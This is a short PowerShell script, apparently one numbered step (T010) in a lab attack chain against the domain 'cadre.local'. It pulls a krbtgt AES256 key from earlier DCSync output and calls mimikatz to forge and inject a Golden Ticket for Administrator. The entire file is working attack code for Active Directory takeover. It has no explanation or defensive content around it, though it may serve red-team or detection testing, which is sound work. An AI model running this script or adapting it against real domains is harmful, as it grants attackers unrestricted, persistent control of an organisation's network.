[CmdletBinding()]
param(
    [string]$DomainSid = "S-1-5-21-277764030-1371232215-1561074416",
    [string]$Mimikatz = "C:\Tools\cadre-attack\mimikatz.exe",
    [string]$DcsyncOut = "C:\Tools\cadre-attack\dcsync-out.txt"
)
$ErrorActionPreference = "Stop"
if (-not (Test-Path $Mimikatz)) { throw "mimikatz missing: $Mimikatz" }
if (-not (Test-Path $DcsyncOut)) { throw "run T009 first — missing $DcsyncOut" }
$line = Select-String -Path $DcsyncOut -Pattern 'aes256_hmac\s+\(4096\)\s+:\s+([A-Fa-f0-9]+)' | Select-Object -First 1
if (-not $line -or -not $line.Matches[0].Groups[1].Value) {
    Write-Output "T010_FAIL: no aes256_hmac in $DcsyncOut"
    exit 1
}
$aes = $line.Matches[0].Groups[1].Value.Trim()
Write-Output "AES256=$aes"
& $Mimikatz "kerberos::golden /user:Administrator /domain:cadre.local /sid:$DomainSid /aes256:$aes /ptt" "exit" 2>&1
Write-Output "T010_OK"
